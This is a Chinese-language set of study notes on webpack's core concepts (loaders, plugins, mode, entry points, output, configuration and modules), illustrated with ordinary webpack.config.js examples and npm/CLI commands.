<h2 id="loader"><a href="#loader" class="headerlink" title="loader"></a>loader</h2><p>loader 让 webpack 能够去处理那些非 JavaScript 文件（webpack 自身只理解 JavaScript）。loader 可以将所有类型的文件转换为 webpack 能够处理的有效模块，然后就可以利用 webpack 的打包能力，对它们进行处理。</p>
<p>webpack loader 将所有类型的文件，转换为应用程序的依赖图（和最终的 bundle）可以直接引用的模块，loader 能够 <code>import</code> 导入任何类型的模块（例如 <code>.css</code> 文件）。</p>
<p>webpack 的配置中 loader 的两个目标：</p>
<ul>
<li><code>test</code> 属性，用于标识出应该被对应的 loader 进行转换的某个或某些文件。</li>
<li><code>use</code> 属性，表示进行转换时，应该使用哪个 loader。</li>
</ul>
<p><strong>webpack.config.js</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</div><div class="line"></div><div class="line"><span class="keyword">const</span> config = &#123;</div><div class="line">  output: &#123;</div><div class="line">    filename: <span class="string">'my-first-webpack.bundle.js'</span></div><div class="line">  &#125;,</div><div class="line">  <span class="built_in">module</span>: &#123;</div><div class="line">    rules: [   <span class="comment">//定义loader</span></div><div class="line">      &#123; <span class="attr">test</span>: <span class="regexp">/\.txt$/</span>, <span class="attr">use</span>: <span class="string">'raw-loader'</span> &#125;</div><div class="line">    ]</div><div class="line">  &#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="built_in">module</span>.exports = config;</div></pre></td></tr></table></figure></p>
<p>以上配置中，对一个单独的 module 对象定义了 rules 属性，里面包含两个必须属性：<code>test</code> 和 <code>use</code>，相当于告诉webpack编译器在进行<code>require()</code>或<code>import</code>时如果遇到<code>.txt</code>文件路径，先使用<code>raw-loader</code>处理后再进行打包。</p>
<p><strong>注意：</strong> 在 webpack 配置中定义 loader 时，要定义在 <code>module.rules</code> 中，而不是 <code>rules</code>。</p>
<h2 id="插件-plugins"><a href="#插件-plugins" class="headerlink" title="插件(plugins)"></a>插件(plugins)</h2><p>loader 被用于转换某些类型的模块，而插件则可以用于执行范围更广的任务。插件的范围包括，从打包优化和压缩，一直到重新定义环境中的变量。</p>
<p>如何使用一个插件：在<code>webpack.config.js</code>配置文件中先<code>require()</code>该插件，然后将其添加到<code>plugins</code>数组中。以在一个配置文件中因为不同目的而多次使用同一个插件，这时需要通过使用 new 操作符来创建它的一个实例。</p>
<p><strong>webpack.config.js</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> HtmlWebpackPlugin = <span class="built_in">require</span>(<span class="string">'html-webpack-plugin'</span>); <span class="comment">// 通过 npm 安装</span></div><div class="line"><span class="keyword">const</span> webpack = <span class="built_in">require</span>(<span class="string">'webpack'</span>); <span class="comment">// 用于访问内置插件</span></div><div class="line"></div><div class="line"><span class="keyword">const</span> config = &#123;</div><div class="line">  <span class="built_in">module</span>: &#123;</div><div class="line">    rules: [</div><div class="line">      &#123; <span class="attr">test</span>: <span class="regexp">/\.txt$/</span>, <span class="attr">use</span>: <span class="string">'raw-loader'</span> &#125;</div><div class="line">    ]</div><div class="line">  &#125;,</div><div class="line">  plugins: [</div><div class="line">    <span class="keyword">new</span> webpack.optimize.UglifyJsPlugin(),</div><div class="line">    <span class="keyword">new</span> HtmlWebpackPlugin(&#123;<span class="attr">template</span>: <span class="string">'./src/index.html'</span>&#125;)</div><div class="line">  ]</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="built_in">module</span>.exports = config;</div></pre></td></tr></table></figure></p>
<h2 id="模式-mode"><a href="#模式-mode" class="headerlink" title="模式(mode)"></a>模式(mode)</h2><p>通过选择 <code>development</code>(开发环境) 或 <code>production</code>(生产环境) 之中的一个，来设置 <code>mode</code> 参数，启用相应模式下的 webpack 内置的优化。</p>
<p><strong>webpack.config.js</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">module</span>.exports = &#123;</div><div class="line">  mode: <span class="string">'production'</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<h1 id="入口起点-Entry-Points"><a href="#入口起点-Entry-Points" class="headerlink" title="入口起点(Entry Points)"></a>入口起点(Entry Points)</h1><p>下面介绍如何配置<code>entry</code>属性。</p>
<h2 id="单个入口（简写）语法"><a href="#单个入口（简写）语法" class="headerlink" title="单个入口（简写）语法"></a>单个入口（简写）语法</h2><p>方法：<code>entry: string|Array&lt;string&gt;</code></p>
<p><strong>webpack.config.js</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> config = &#123;</div><div class="line">  entry: <span class="string">'./src/index.js'</span></div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="built_in">module</span>.exports = config;</div></pre></td></tr></table></figure></p>
<p>entry 属性的单个入口语法，是下面形式的简写：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> config = &#123;</div><div class="line">  entry: &#123;</div><div class="line">    main: <span class="string">'./src/index.js'</span></div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>向 <code>entry</code> 属性传入「文件路径(file path)数组」将创建“多个主入口(multi-main entry)”。在想要多个依赖文件一起注入，并且将它们的依赖导向(graph)到一个“chunk”时，传入数组的方式就很有用。 </p>
<h2 id="对象语法"><a href="#对象语法" class="headerlink" title="对象语法"></a>对象语法</h2><p>用法：<code>entry: {[entryChunkName: string]: string|Array&lt;string&gt;}</code></p>
<p><strong>webpack.config.js</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> config = &#123;</div><div class="line">  entry: &#123;</div><div class="line">    app: <span class="string">'./src/app.js'</span>,</div><div class="line">    vendors: <span class="string">'./src/vendors.js'</span></div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>对象语法比较繁琐，但这是应用程序中定义入口的最可扩展的方式。</p>
<p><strong>“可扩展的 webpack 配置”：</strong> 是指可重用并且可以与其他配置组合使用。这是一种流行的技术，用于将关注点(concern)从环境(environment)、构建目标(build target)、运行时(runtime)中分离，然后使用专门的工具（如 webpack-merge）将它们合并。</p>
<p>以上<code>webpack.config.js</code>配置中，<code>entry</code>属性作为分离应用程序(app) 和 第三方库(vendor)入口， webpack 从 <code>app.js</code> 和 <code>vendors.js</code> 开始创建依赖图，这些依赖图是彼此完全分离、互相独立的(每个 bundle 中都有一个 webpack 引导)，该种方式比较常见于，只有一个入口起点（不包括 vendor）的 <strong>单页应用程序</strong> 中。</p>
<p><strong>why？</strong> 此设置允许使用 <code>CommonsChunkPlugin</code> 从「应用程序 bundle」中提取 vendor 引用到 vendor bundle，并把引用 vendor 的部分替换为 <code>__webpack_require__()</code> 调用，如果应用程序 bundle 中没有 vendor 代码，那么可以在 webpack 中实现被称为长效缓存的通用模式。（<strong>不是很懂这个地方？？？</strong>）</p>
<h2 id="多页面应用程序"><a href="#多页面应用程序" class="headerlink" title="多页面应用程序"></a>多页面应用程序</h2><p><strong>webpack.config.js</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> config = &#123;</div><div class="line">  entry: &#123;</div><div class="line">    pageOne: <span class="string">'./src/pageOne/index.js'</span>,</div><div class="line">    pageTwo: <span class="string">'./src/pageTwo/index.js'</span>,</div><div class="line">    pageThree: <span class="string">'./src/pageThree/index.js'</span></div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>改配置指示webpack 需要 3 个独立分离的依赖图。</p>
<p>在多页应用中，每当页面跳转时服务器将为获取一个新的 HTML 文档，页面重新加载新文档，并且资源被重新下载。然而，这给了我们特殊的机会去做很多事：</p>
<ul>
<li>使用 <code>CommonsChunkPlugin</code> 为每个页面间的应用程序共享代码创建 bundle。由于入口起点增多，多页应用能够复用入口起点之间的大量代码/模块，从而可以极大地从这些技术中受益。</li>
</ul>
<p><strong>注意：</strong> 每个 HTML 文档只使用一个入口起点。</p>
<h1 id="输出-Output"><a href="#输出-Output" class="headerlink" title="输出(Output)"></a>输出(Output)</h1><p>配置 <code>output</code> 属性可以控制 webpack 如何向硬盘写入编译文件。<br><strong>注意：</strong> 即使可以存在多个入口起点，但只指定一个输出配置。</p>
<h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><p>配置 <code>output</code> 属性的最低要求是，将它的值设置为一个对象，包括以下两点：</p>
<ul>
<li><code>filename</code> 用于输出文件的文件名。</li>
<li>目标输出目录 <code>path</code> 的 <strong>绝对路径</strong> 。</li>
</ul>
<p><strong>webpack.config.js</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> config = &#123;</div><div class="line">  output: &#123;</div><div class="line">    filename: <span class="string">'bundle.js'</span>,</div><div class="line">    path: <span class="string">'/home/proj/public/assets'</span></div><div class="line">  &#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="built_in">module</span>.exports = config;</div></pre></td></tr></table></figure></p>
<h2 id="多个入口起点"><a href="#多个入口起点" class="headerlink" title="多个入口起点"></a>多个入口起点</h2><p>如果配置创建了多个单独的 “chunk”（例如，使用多个入口起点或使用 <code>CommonsChunkPlugin</code> 这样的插件），则应该使用占位符来确保每个文件具有唯一的名称。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">  entry: &#123;</div><div class="line">    app: <span class="string">'./src/app.js'</span>,</div><div class="line">    search: <span class="string">'./src/search.js'</span></div><div class="line">  &#125;,</div><div class="line">  output: &#123;</div><div class="line">    filename: <span class="string">'[name].js'</span>,</div><div class="line">    path: __dirname + <span class="string">'/dist'</span></div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// 写入到硬盘：./dist/app.js, ./dist/search.js</span></div></pre></td></tr></table></figure>
<h2 id="高级功能"><a href="#高级功能" class="headerlink" title="高级功能"></a>高级功能</h2><p>以下是使用 CDN 和资源 hash 的复杂示例：</p>
<p><strong>webpack.config.js</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">output: &#123;</div><div class="line">  path: <span class="string">"/home/proj/cdn/assets/[hash]"</span>,</div><div class="line">  publicPath: <span class="string">"http://cdn.example.com/assets/[hash]/"</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>在编译时不知道最终输出文件的 <code>publicPath</code> 的情况下，<code>publicPath</code> 可以留空，并且在入口起点文件运行时动态设置,在入口起点设置 <code>__webpack_public_path__</code>，如下：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">__webpack_public_path__ = myRuntimePublicPath</div><div class="line"></div><div class="line"><span class="comment">// 剩余的应用程序入口</span></div></pre></td></tr></table></figure>
<h1 id="模式-Mode"><a href="#模式-Mode" class="headerlink" title="模式(Mode)"></a>模式(Mode)</h1><p><code>mode</code> 配置选项，指示 webpack 使用相应模式的内置优化。</p>
<h2 id="用法-1"><a href="#用法-1" class="headerlink" title="用法"></a>用法</h2><p>(1) 在配置文件中提供<code>mode</code>属性：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">module</span>.exports = &#123;</div><div class="line">  mode: <span class="string">'production'</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>(2) 从 CLI 参数中传递: <code>webpack --mode=production</code></p>
<p>支持以下字符串值：<br><img src="http://ou3oh86t1.bkt.clouddn.com/webpack-demo/mode.png" alt="mode"><br><strong>注意：</strong> 只设置 <code>NODE_ENV</code>，则不会自动设置 <code>mode</code>。</p>
<p><strong>mode:development</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// webpack.development.config.js</span></div><div class="line"><span class="built_in">module</span>.exports = &#123;</div><div class="line">+ mode: <span class="string">'development'</span></div><div class="line">- plugins: [</div><div class="line">-   <span class="keyword">new</span> webpack.NamedModulesPlugin(),</div><div class="line">-   <span class="keyword">new</span> webpack.DefinePlugin(&#123; <span class="string">"process.env.NODE_ENV"</span>: <span class="built_in">JSON</span>.stringify(<span class="string">"development"</span>) &#125;),</div><div class="line">- ]</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><strong>mode:production</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// webpack.production.config.js</span></div><div class="line"><span class="built_in">module</span>.exports = &#123;</div><div class="line">+  mode: <span class="string">'production'</span>,</div><div class="line">-  plugins: [</div><div class="line">-    <span class="keyword">new</span> UglifyJsPlugin(<span class="comment">/* ... */</span>),</div><div class="line">-    <span class="keyword">new</span> webpack.DefinePlugin(&#123; <span class="string">"process.env.NODE_ENV"</span>: <span class="built_in">JSON</span>.stringify(<span class="string">"production"</span>) &#125;),</div><div class="line">-    <span class="keyword">new</span> webpack.optimize.ModuleConcatenationPlugin(),</div><div class="line">-    <span class="keyword">new</span> webpack.NoEmitOnErrorsPlugin()</div><div class="line">-  ]</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h1 id="loader-1"><a href="#loader-1" class="headerlink" title="loader"></a>loader</h1><p>loader 用于对模块的源代码进行转换。loader 可以使你在 import 或”加载”模块时预处理文件。<br>loader 可以将文件从不同的语言（如 TypeScript）转换为 JavaScript，或将内联图像转换为 data URL。loader 甚至允许你直接在 JavaScript 模块中 <code>import</code> CSS文件。</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>可以使用 loader 告诉 webpack 加载 CSS 文件，或者将 TypeScript 转为 JavaScript。为此，首先安装相对应的 loader：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">npm install --save-dev css-loader</div><div class="line">npm install --save-dev ts-loader</div></pre></td></tr></table></figure></p>
<p>然后指示 webpack 对每个 <code>.css</code> 使用 <code>css-loader</code>，对每个 <code>.ts</code> 文件使用 <code>ts-loader</code>。</p>
<p><strong>webpack.config.js</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">module</span>.exports = &#123;</div><div class="line">  <span class="built_in">module</span>: &#123;</div><div class="line">    rules: [</div><div class="line">      &#123; <span class="attr">test</span>: <span class="regexp">/\.css$/</span>, <span class="attr">use</span>: <span class="string">'css-loader'</span> &#125;,</div><div class="line">      &#123; <span class="attr">test</span>: <span class="regexp">/\.ts$/</span>, <span class="attr">use</span>: <span class="string">'ts-loader'</span> &#125;</div><div class="line">    ]</div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<h2 id="使用-loader"><a href="#使用-loader" class="headerlink" title="使用 loader"></a>使用 loader</h2><p>有三种使用 loader 的方式：</p>
<ul>
<li>配置（推荐）：在 <code>webpack.config.js</code> 文件中指定 loader。</li>
<li>内联：在每个 <code>import</code> 语句中显式指定 loader。</li>
<li>CLI：在 shell 命令中指定它们。</li>
<li><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3>在<code>webpack.config.js</code>配置文件中，通过<code>module.rules</code>指定多个 loader。</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">module</span>: &#123;</div><div class="line">  rules: [</div><div class="line">    &#123;</div><div class="line">      test: <span class="regexp">/\.css$/</span>,</div><div class="line">      use: [</div><div class="line">        &#123; <span class="attr">loader</span>: <span class="string">'style-loader'</span> &#125;,</div><div class="line">        &#123;</div><div class="line">          loader: <span class="string">'css-loader'</span>,</div><div class="line">          options: &#123;</div><div class="line">            modules: <span class="literal">true</span></div><div class="line">          &#125;</div><div class="line">        &#125;</div><div class="line">      ]</div><div class="line">    &#125;</div><div class="line">  ]</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="内联"><a href="#内联" class="headerlink" title="内联"></a>内联</h3><p>可以在 <code>import</code> 语句或任何等效于 “import” 的方式中指定 loader。使用 <code>!</code> 将资源中的 loader 分开。分开的每个部分都相对于当前目录解析。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> Styles <span class="keyword">from</span> <span class="string">'style-loader!css-loader?modules!./styles.css'</span>;</div></pre></td></tr></table></figure></p>
<p>选项可以传递查询参数，例如 <code>?key=value&amp;foo=bar</code>，或者一个 JSON 对象，例如 <code>?{&quot;key&quot;:&quot;value&quot;,&quot;foo&quot;:&quot;bar&quot;}</code>。</p>
<p><strong>注意：</strong> 尽可能使用 <code>module.rules</code>，因为这样可以减少源码中的代码量，并且可以在出错时，更快地调试和定位 loader 中的问题。 </p>
<h3 id="CLI"><a href="#CLI" class="headerlink" title="CLI"></a>CLI</h3><p>可以通过 CLI 使用 loader:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">webpack --module-bind jade-loader --module-bind 'css=style-loader!css-loader'</div></pre></td></tr></table></figure></p>
<p>以上命令对 <code>.jade</code> 文件使用 <code>jade-loader</code>，对 <code>.css</code> 文件使用 <code>style-loader</code> 和 <code>css-loader</code>。</p>
<h2 id="loader特性"><a href="#loader特性" class="headerlink" title="loader特性"></a>loader特性</h2><ul>
<li>loader 支持链式传递。能够对资源使用流水线(pipeline)，一组链式的 loader 将按照相反的顺序执行。loader 链中的第一个 loader 返回值给下一个 loader，在最后一个 loader，返回 webpack 所预期的 JavaScript。</li>
<li>loader 可以是同步的，也可以是异步的。</li>
<li>loader 运行在 Node.js 中，并且能够执行任何可能的操作。</li>
<li>loader 接收查询参数。用于对 loader 传递配置。</li>
<li>loader 也能够使用 <code>options</code> 对象进行配置。</li>
<li>除了使用 <code>package.json</code> 常见的 <code>main</code> 属性，还可以将普通的 npm 模块导出为 loader，做法是在 <code>package.json</code> 里定义一个 <code>loader</code> 字段。</li>
<li>插件(plugin)可以为 loader 带来更多特性。</li>
<li>loader 能够产生额外的任意文件。</li>
</ul>
<h1 id="插件-Plugins"><a href="#插件-Plugins" class="headerlink" title="插件(Plugins)"></a>插件(Plugins)</h1><p>插件是 wepback 的支柱功能，插件目的在于解决 loader 无法实现的其他事。</p>
<p>webpack 插件是一个具有 <code>apply</code> 属性的 JavaScript 对象。apply 属性会被 webpack compiler 调用，并且 compiler 对象可在整个编译生命周期访问。</p>
<p><strong>ConsoleLogOnBuildWebpackPlugin.js</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> pluginName = <span class="string">'ConsoleLogOnBuildWebpackPlugin'</span>;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConsoleLogOnBuildWebpackPlugin</span> </span>&#123;</div><div class="line">    apply(compiler) &#123;</div><div class="line">        compiler.hooks.run.tap(pluginName, compilation =&gt; &#123;</div><div class="line">            <span class="built_in">console</span>.log(<span class="string">"webpack 构建过程开始！"</span>);</div><div class="line">        &#125;);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>compiler hook 的 tap 方法的第一个参数，应该是驼峰式命名的插件名称。建议为此使用一个常量，以便它可以在所有 hook 中复用。</p>
<h2 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h2><p>由于插件可以携带参数/选项，必须在 webpack 配置中，向 <code>plugins</code> 属性传入 <code>new</code> 实例。</p>
<p><strong>webpack.config.js</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> HtmlWebpackPlugin = <span class="built_in">require</span>(<span class="string">'html-webpack-plugin'</span>); <span class="comment">//通过 npm 安装</span></div><div class="line"><span class="keyword">const</span> webpack = <span class="built_in">require</span>(<span class="string">'webpack'</span>); <span class="comment">//访问内置的插件</span></div><div class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</div><div class="line"></div><div class="line"><span class="keyword">const</span> config = &#123;</div><div class="line">  entry: <span class="string">'./path/to/my/entry/file.js'</span>,</div><div class="line">  output: &#123;</div><div class="line">    filename: <span class="string">'my-first-webpack.bundle.js'</span>,</div><div class="line">    path: path.resolve(__dirname, <span class="string">'dist'</span>)</div><div class="line">  &#125;,</div><div class="line">  <span class="built_in">module</span>: &#123;</div><div class="line">    rules: [</div><div class="line">      &#123;</div><div class="line">        test: <span class="regexp">/\.(js|jsx)$/</span>,</div><div class="line">        use: <span class="string">'babel-loader'</span></div><div class="line">      &#125;</div><div class="line">    ]</div><div class="line">  &#125;,</div><div class="line">  plugins: [</div><div class="line">    <span class="keyword">new</span> webpack.optimize.UglifyJsPlugin(),</div><div class="line">    <span class="keyword">new</span> HtmlWebpackPlugin(&#123;<span class="attr">template</span>: <span class="string">'./src/index.html'</span>&#125;)</div><div class="line">  ]</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="built_in">module</span>.exports = config;</div></pre></td></tr></table></figure></p>
<h2 id="Node-API"><a href="#Node-API" class="headerlink" title="Node API"></a>Node API</h2><p>注意：即便使用 Node API，用户也应该在配置中传入 <code>plugins</code> 属性。<code>compiler.apply</code> 并不是推荐的使用方式。</p>
<p><strong>some-node-script.js</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> webpack = <span class="built_in">require</span>(<span class="string">'webpack'</span>); <span class="comment">//访问 webpack 运行时(runtime)</span></div><div class="line"><span class="keyword">const</span> configuration = <span class="built_in">require</span>(<span class="string">'./webpack.config.js'</span>);</div><div class="line"></div><div class="line"><span class="keyword">let</span> compiler = webpack(configuration);</div><div class="line">compiler.apply(<span class="keyword">new</span> webpack.ProgressPlugin());</div><div class="line"></div><div class="line">compiler.run(<span class="function"><span class="keyword">function</span>(<span class="params">err, stats</span>) </span>&#123;</div><div class="line">  <span class="comment">// ...</span></div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
<h1 id="配置-Configuration"><a href="#配置-Configuration" class="headerlink" title="配置(Configuration)"></a>配置(Configuration)</h1><p>webpack 的配置文件，是导出一个对象的 JavaScript 文件,该导出对象由 webpack 根据对象定义的属性进行解析。</p>
<p>webpack 配置是标准的 Node.js CommonJS 模块：</p>
<ul>
<li>通过 <code>require(...)</code> 导入其他文件</li>
<li>通过 <code>require(...)</code> 使用 npm 的工具函数</li>
<li>使用 JavaScript 控制流表达式，例如 <code>?:</code> 操作符</li>
<li>对常用值使用常量或变量</li>
<li>编写并执行函数来生成部分配置</li>
</ul>
<p><strong>应避免以下做法:</strong></p>
<ul>
<li>在使用 webpack 命令行接口(CLI)（应该编写自己的命令行接口，或使用 <code>--env</code>）时，访问命令行接口(CLI)参数</li>
<li>导出不确定的值（调用 webpack 两次应该产生同样的输出文件）</li>
<li>编写很长的配置（应该将配置拆分为多个文件）</li>
</ul>
<h2 id="基本配置"><a href="#基本配置" class="headerlink" title="基本配置"></a>基本配置</h2><p><strong>webpack.config.js</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</div><div class="line"></div><div class="line"><span class="built_in">module</span>.exports = &#123;</div><div class="line">  mode: <span class="string">'development'</span>,</div><div class="line">  entry: <span class="string">'./foo.js'</span>,</div><div class="line">  output: &#123;</div><div class="line">    path: path.resolve(__dirname, <span class="string">'dist'</span>),</div><div class="line">    filename: <span class="string">'foo.bundle.js'</span></div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<h2 id="多个-Target"><a href="#多个-Target" class="headerlink" title="多个 Target"></a>多个 Target</h2><p>导出多个配置，当运行 webpack 时，所有的配置对象都会构建。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">module</span>.exports = [&#123;</div><div class="line">  output: &#123;</div><div class="line">    filename: <span class="string">'./dist-amd.js'</span>,</div><div class="line">    libraryTarget: <span class="string">'amd'</span></div><div class="line">  &#125;,</div><div class="line">  entry: <span class="string">'./app.js'</span>,</div><div class="line">  mode: <span class="string">'production'</span>,</div><div class="line">&#125;, &#123;</div><div class="line">  output: &#123;</div><div class="line">    filename: <span class="string">'./dist-commonjs.js'</span>,</div><div class="line">    libraryTarget: <span class="string">'commonjs'</span></div><div class="line">  &#125;,</div><div class="line">  entry: <span class="string">'./app.js'</span>,</div><div class="line">  mode: <span class="string">'production'</span>,</div><div class="line">&#125;]</div></pre></td></tr></table></figure></p>
<h2 id="使用其他配置语言"><a href="#使用其他配置语言" class="headerlink" title="使用其他配置语言"></a>使用其他配置语言</h2><p>webpack 接受以多种编程和数据语言编写的配置文件。使用 <a href="https://github.com/js-cli/js-interpret" target="_blank" rel="noopener">node-interpret</a>，webpack 可以处理许多不同类型的配置文件。</p>
<h1 id="模块-Modules"><a href="#模块-Modules" class="headerlink" title="模块(Modules)"></a>模块(Modules)</h1><p>在模块化编程中，开发者将程序分解成离散功能块(discrete chunks of functionality)，并称之为<em>模块</em>。<br>Node.js 从最一开始就支持模块化编程。然而，在 web，模块化的支持正缓慢到来。在 web 存在多种支持 JavaScript 模块化的工具。</p>
<h2 id="webpack-模块"><a href="#webpack-模块" class="headerlink" title="webpack 模块"></a>webpack 模块</h2><p>对比 Node.js 模块，webpack <em>模块</em>能够以各种方式表达它们的依赖关系：</p>
<ul>
<li>ES2015 <code>import</code> 语句</li>
<li>CommonJS <code>require()</code> 语句</li>
<li>AMD <code>define</code> 和 <code>require</code> 语句</li>
<li>css/sass/less 文件中的 <code>@import</code> 语句</li>
<li>样式(<code>url(...)</code>)或 HTML 文件(<code>&lt;img src=...&gt;</code>)中的图片链接(image url)</li>
</ul>
